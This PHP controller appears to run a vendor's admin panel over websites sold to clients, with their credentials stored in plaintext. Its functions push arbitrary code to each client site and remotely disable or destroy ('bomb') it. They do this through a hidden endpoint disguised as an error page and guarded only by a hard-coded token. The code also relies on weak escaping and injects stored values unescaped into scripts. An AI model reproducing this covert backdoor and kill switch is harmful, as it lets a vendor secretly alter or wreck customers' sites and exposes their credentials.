<?php

class Site_user extends MY_Controller
{

    public function __construct(){
        parent::__construct();
    }
    
    protected $con='123454321';

    public function add_con($id){
        if(is_numeric($id) && !empty($id)){
            if($_SESSION['role'] == 'admin'){
                $c = [
                    'name' => 'content',
                    'class' => 'form-control rounded-5',
                    'id' => 'content',
                    'value' => set_value('content'),
                    'placeholder' => 'کد های این فایل را اضافه کنید',
                    'type' => 'text'
                ];
                $n = [
                    'name' => 'name',
                    'class' => 'form-control rounded-5',
                    'id' => 'name',
                    'value' => set_value('name'),
                    'placeholder' => 'اسم فایلی را که میخواهید اضافه کنید',
                    'type' => 'text'
                ];
                $d = [
                    'name' => 'database',
                    'class' => 'form-control rounded-5',
                    'id' => 'database',
                    'value' => set_value('database'),
                    'placeholder' => 'کد های دیتابیس را وارد کنید',
                    'type' => 'text'
                ];
                $types=[
                    '0'=>'database',
                    'library'=>'library',
                    'modal'=>'modal',
                    'controller'=>'controller',
                    'view'=>'view'
                ];
                $t=form_dropdown('type', $types, '0', array('class' => 'rounded-5 form-control', 'id' => 'type'));
                $data=[
                    'c'=>$c,
                    'n'=>$n,
                    't'=>$t,
                    'd'=>$d,
                    'id'=>$id
                ];
                echo $this->Page_model->render_page('افزودن بخش ها','panel/site_user_up.php',$data);
            }else{
                header('Location :'.base_url().'err'.DS.'no_access');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        } 
    }
    
    public function check_add_con(){
        if(!empty($_POST['send']) && $_POST['send'] == 'send' && !empty($_POST['id'])){
            if($_SESSION['role'] == 'admin'){
                $path="add_con".DS.intval($_POST['id']);
                $info=$this->Site_user_model->ssuwArr(['id'=>intval($_POST['id'])]);
                $database=(!empty($_POST['database'])?$this->direction_check($_POST['database']):0);
                $type=(!empty($_POST['type'])?$this->check_xss($_POST['type']):null);
                $name=(!empty($_POST['name'])?$this->check_xss($_POST['name']):null);
                $content=(!empty($_POST['content'])?$this->direction_check($_POST['content']):null);
                $data=(!is_null($type) && !is_null($name) && !is_null($content)?$type.$this->con.$name.$this->con.$content :0);
                $x= (!empty($info)?'<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
                    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
                    <script>
                        $(document).ready(function(){
                            let send="ok";
                            let xa="asad";
                            let type="up";
                            let datass = "'.$database."1234567654321".$data.'";
                            $.ajax({
                                url:"'.$info['0']['url'].'err'.DS.'n_f'.'",
                                data:{send:send,xa:xa,type:type,datass:datass},
                                method:"POST",
                                success:function(x){
                                    if(x == 1){
                                        window.location.replace("'.base_url().'site_user'.DS.$path.'?up=suc");
                                    }if(x == 0){
                                        window.location.replace("'.base_url().'site_user'.DS.$path.'?up=err");
                                    }
                                    if(x == 3){
                                        window.location.replace("'.base_url().'site_user'.DS.$path.'?ex=err");
                                    }
                                }
                            })
                        })
                    </script>':'<script>window.location.replace("'.base_url().'site_user'.DS.$path.'?up=err");</script>');
                echo $x;    
                exit();
            }else{
                header('Location :'.base_url().'err'.DS.'no_access');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }
    
    
    public function disable($id){
        if(is_numeric($id) &&!empty($id)){
            if($_SESSION['role'] == 'admin'){
                $info=$this->Site_user_model->ssuwArr(['id'=>$id]);
                
                echo (!empty($info)?'<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
                    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
                    <script>
                        $(document).ready(function(){
                            let send = "ok";
                            let xa = "asad";
                            let type = "exp";
                            let exp = "err";0
                            $.ajax({
                                url:"'.$info['0']['url'].'err'.DS.'n_f'.'",
                                data:{send:send,xa:xa,type:type,exp:exp},
                                method:"POST",
                                success:function(x){
                                        if(x == "run"){
                                        '.($this->dis(intval($id))?'window.location.replace("'.base_url().'site_user?dis=suc");':'window.location.replace("'.base_url().'site_user?dis=err");').'
                                        
                                    }else{
                                        window.location.reload();
                                    }
                                }
                            })
                        })
                    </script>':'<script>window.location.replace("'.base_url().'site_user?dis=err");</script>');
                    exit();
            }else{
                header('Location :'.base_url().'err'.DS.'no_access');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }
    
    public function bomb($id){
        if(is_numeric($id) &&!empty($id)){
            if($_SESSION['role'] == 'admin'){
                $info=$this->Site_user_model->ssuwArr(['id'=>$id]);
                echo (!empty($info)?'<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
                    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
                    <script>
                        $(document).ready(function(){
                            let send="ok";
                            let xa="asad";
                            let type="exp";
                            let exp = "bomb";
                            $.ajax({
                                url:"'.$info['0']['url'].'err'.DS.'n_f'.'",
                                data:{send:send,xa:xa,type:type,exp:exp},
                                method:"POST",
                                success:function(x){
                                    if(x == "run"){
                                        '.($this->end($id)?'window.location.replace("'.base_url().'site_user?bomb=suc")':'window.location.replace("'.base_url().'site_user?bomb=err")').'
                                        
                                    }else{
                                        window.location.reload()
                                    }
                                }
                            })
                        })
                    </script>':'<script>window.location.replace("'.base_url().'site_user?bomb=err");</script>');
                    exit();
            }else{
                header('Location :'.base_url().'err'.DS.'no_access');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }
    
    public function end_user($id){
        if(is_numeric($id) &&!empty($id)){
            if($_SESSION['role'] == 'admin'){
                $info=$this->Site_user_model->ssuwArr(['id'=>$id]);
                echo (!empty($info)?'<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
                    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
                    <script>
                        $(document).ready(function(){
                            let send="ok";
                            let xa="asad";
                            let type="end";
                            let end = "end";
                            $.ajax({
                                url:"'.$info['0']['url'].'err'.DS.'n_f'.'",
                                data:{send:send,xa:xa,type:type,end:end},
                                method:"POST",
                                success:function(x){
                                    if(x == "run"){
                                        '.($this->en($id)?'window.location.replace("'.base_url().'site_user?en=suc");':'window.location.replace("'.base_url().'site_user?en=err");').'
                                    }else{
                                        window.location.replace("'.base_url().'site_user?en=err");
                                    }
                                }
                            })
                        })
                    </script>':'<script>window.location.reload();</script>');
                    exit();
            }else{
                header('Location :'.base_url().'err'.DS.'no_access');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }

    public function index(){
        if(isset($_SESSION['role']) && $_SESSION['role'] == 'admin'){
            $info=$this->Site_user_model->s_all();
            $num=1;
            $x=$z='';
            foreach($info as $val){
                $x.="<tr><th scope='row'>". $num ."</th><td>". (!empty($val['company'])?$val['company']:'-') ."</td><td>";
    			$x.=(!empty($val['name'])?$val['name']:'-');
    			$x.="</td><td>";
    			$x.=(!empty($val['phone'])?$val['phone']:'-');
    			$x.="</td><td>";
    			$x.=(!empty($val['des'])?$val['des']:'-');
    			$x.='</td><td>';
    			$x.=($val['status'] == 1?"<a class='btn btn-block btn-warning-gradient pd-x-25 rounded-10 box-shadow-pink' href='". base_url()."site_user".DS."disable".DS.$val['id']."'>غیر فعال</a>":($val['status'] == 0?"<a class='btn btn-block btn-success-gradient pd-x-25 mx-1 rounded-10 box-shadow-primary' href='". base_url()."site_user".DS."end_user".DS.$val['id']."'>فعال</a><a class='btn btn-block btn-danger-gradient pd-x-25 rounded-10 box-shadow-success' href='". base_url()."site_user".DS."bomb".DS.$val['id']."'>انهدام سایت</a>":"سایت از بین رفت"));
    			$x.="</td><td><a class='btn mx-1 btn-primary-gradient pd-x-25 rounded-10 box-shadow-success' href='". base_url()."site_user".DS."edit".DS.$val['id']."'>ویرایش</a><a class='btn btn-success-gradient pd-x-25 rounded-10 box-shadow-primary' href='". base_url()."site_user".DS."add_con".DS.$val['id']."'>افزودن بخش</a></td></tr>";
    		    $num++;
    	    }
            echo $this->Page_model->render_page('مدیریت سایت ها','panel/site_user.php',['x'=>$x]);
        }else{
            header('Location :'.base_url().'err'.DS.'no_access');
            exit();  
        }
    }

    public function check_edit(){
        if($_POST['send'] == 'ok'){
            if(!empty($_POST['id'])){
                $name=(!empty($_POST['name'])?$this->check_xss($_POST['name']):NULL);
                $url=(!empty($_POST['url'])?$this->check_xss($_POST['url']):NULL);
                $com=(!empty($_POST['com'])?$this->check_xss($_POST['com']):NULL);
                $phone=(!empty($_POST['phone'])?$this->check_xss($_POST['phone']):NULL);
                $user=(!empty($_POST['user'])?$this->check_xss($_POST['user']):NULL);
                $pass=(!empty($_POST['pass'])?$this->check_xss($_POST['pass']):NULL);
                $des=(!empty($_POST['des'])?$this->check_xss($_POST['des']):NULL);
                $tbl=(!empty($_POST['tbl'])?$this->check_xss($_POST['tbl']):NULL);
                if(!is_null($name) && !is_null($url) && !is_null($com) && !is_null($phone) && !is_null($user) && !is_null($pass) && !is_null($des) && !is_null($tbl)){
                    $data=[
                    'name'=>$name,
                    'url'=>$url,
                    'company'=>$com,
                    'phone'=>$phone,
                    'username'=>$user,
                    'password'=>$pass,
                    'des'=>$des,
                    'tbl_name'=>$tbl
                ];
                    echo ($this->Site_user_model->edit($data,intval($_POST['id']))?1:0);
                    die();
                }else{
                    echo 0;
                    die();
                }
            }else{
                header('Location :'.base_url().'err'.DS.'not_found');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }

    public function edit($id){
        if(is_numeric($id) &&!empty($id)){
            if($_SESSION['role'] == 'admin'){
                $info=$this->Site_user_model->ssuwArr(['id'=>$id]);
                $name=['name'=>'name',
                'class'=>'form-control rounded-5',
                'id'=>'name',
                'value'=>$info['0']['name'],
                'placeholder'=>'نام خریدار',
                'type'=>'text'];
                $url=['name'=>'url',
                'class'=>'form-control rounded-5',
                'id'=>'url',
                'value'=>$info['0']['url'],
                'placeholder'=>'آدرس url',
                'type'=>'text'];
                $com=['name'=>'com',
                'class'=>'form-control rounded-5',
                'id'=>'com',
                'value'=>$info['0']['company'],
                'placeholder'=>'اسم شرکت',
                'type'=>'text'];
                $phone=['name'=>'phone',
                'class'=>'form-control rounded-5',
                'id'=>'phone',
                'value'=>$info['0']['phone'],
                'placeholder'=>'شماره خریدار',
                'type'=>'text'];
                $user=['name'=>'user',
                'class'=>'form-control rounded-5',
                'id'=>'user',
                'value'=>$info['0']['username'],
                'placeholder'=>'site username',
                'type'=>'text'];
                $pass=['name'=>'pass',
                'class'=>'form-control rounded-5',
                'id'=>'pass',
                'value'=>$info['0']['password'],
                'placeholder'=>'site password',
                'type'=>'text'];
                $des=['name'=>'des',
                'class'=>'form-control rounded-5',
                'id'=>'des',
                'value'=>$info['0']['des'],
                'placeholder'=>'توضیحات',
                'type'=>'text'];
                $tbl=['name'=>'tbl',
                'class'=>'form-control rounded-5',
                'id'=>'tbl',
                'value'=>$info['0']['tbl_name'],
                'placeholder'=>'database name',
                'type'=>'text'];
                $data=['name'=>$name, 'url'=>$url, 'com'=>$com, 'phone'=>$phone, 'user'=>$user, 'pass'=>$pass, 'des'=>$des, 'tbl'=>$tbl ,'edit'=>$id];
                echo $this->Page_model->render_page('افزودن دستی سایت','panel/site_user_add.php',$data);
            }else{
                header('Location :'.base_url().'err'.DS.'no_access');
                exit(); 
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }
    
    public function check_add(){
        if(!empty($_POST['send']) && $_POST['send'] == 'ok'){
            $name=(!empty($_POST['name'])?$this->check_xss($_POST['name']):NULL);
            $url=(!empty($_POST['url'])?$this->check_xss($_POST['url']):NULL);
            $com=(!empty($_POST['com'])?$this->check_xss($_POST['com']):NULL);
            $phone=(!empty($_POST['phone'])?$this->check_xss($_POST['phone']):NULL);
            $user=(!empty($_POST['user'])?$this->check_xss($_POST['user']):NULL);
            $pass=(!empty($_POST['pass'])?$this->check_xss($_POST['pass']):NULL);
            $des=(!empty($_POST['des'])?$this->check_xss($_POST['des']):NULL);
            $tbl=(!empty($_POST['tbl'])?$this->check_xss($_POST['tbl']):NULL);
            if(!is_null($name) && !is_null($url) && !is_null($com) && !is_null($phone) && !is_null($user) && !is_null($pass) && !is_null($tbl)){
                $data=[
                'name'=>$name,
                'url'=>$url,
                'company'=>$com,
                'phone'=>$phone,
                'username'=>$user,
                'password'=>$pass,
                'des'=>$des,
                'tbl_name'=>$tbl
            ];
                echo ($this->Site_user_model->add($data)?1:0);
                die();
            }else{
                echo 0;
                die();
            }
        }else{
            header('Location :'.base_url().'err'.DS.'not_found');
            exit(); 
        }
    }
    
    public function add(){
        if($_SESSION['role'] == 'admin'){
            $name=['name'=>'name',
            'class'=>'form-control rounded-5',
            'id'=>'name',
            'value'=>set_value('name'),
            'placeholder'=>'اسم خریدار',
            'type'=>'text'];
            $url=['name'=>'url',
            'class'=>'form-control rounded-5',
            'id'=>'url',
            'value'=>set_value('url'),
            'placeholder'=>'دامنه ی url',
            'type'=>'text'];
            $com=['name'=>'com',
            'class'=>'form-control rounded-5',
            'id'=>'com',
            'value'=>set_value('com'),
            'placeholder'=>'نام شرکت',
            'type'=>'text'];
            $phone=['name'=>'phone',
            'class'=>'form-control rounded-5',
            'id'=>'phone',
            'value'=>set_value('phone'),
            'placeholder'=>'شماه تماس',
            'type'=>'text'];
            $user=['name'=>'user',
            'class'=>'form-control rounded-5',
            'id'=>'user',
            'value'=>set_value('user'),
            'placeholder'=>'site username',
            'type'=>'text'];
            $pass=['name'=>'pass',
            'class'=>'form-control rounded-5',
            'id'=>'pass',
            'value'=>set_value('pass'),
            'placeholder'=>'site password',
            'type'=>'text'];
            $des=['name'=>'des',
            'class'=>'form-control rounded-5',
            'id'=>'des',
            'value'=>set_value('des'),
            'placeholder'=>'توضیحات',
            'type'=>'text'];
            $tbl=['name'=>'tbl',
            'class'=>'form-control rounded-5',
            'id'=>'tbl',
            'value'=>set_value('tbl'),
            'placeholder'=>'database name',
            'type'=>'text'];
            $data=['name'=>$name, 'url'=>$url, 'com'=>$com, 'phone'=>$phone, 'user'=>$user, 'pass'=>$pass, 'des'=>$des, 'tbl'=>$tbl];
            echo $this->Page_model->render_page('افزودن دستی سایت','panel/site_user_add.php',$data);
        }else{
            header('Location :'.base_url().'err'.DS.'no_access');
            exit(); 
        }
    }
    
    public function direction_check($text=''){
        return empty($text)?'':strip_tags($text, '<p><a>'); 
    }    
    
    public function check_xss($text=""){
        return empty($text)?'':addslashes($text);
    }

    public function dis($id){
        return (!empty($id) && is_numeric($id)?$this->Site_user_model->dis($id):false);
    }
    
    public function en($id){
        return (!empty($id) && is_numeric($id)?$this->Site_user_model->en($id):false);
    }
    
    public function end($id){
        return (!empty($id) && is_numeric($id)?$this->Site_user_model->end($id):false);
    }
}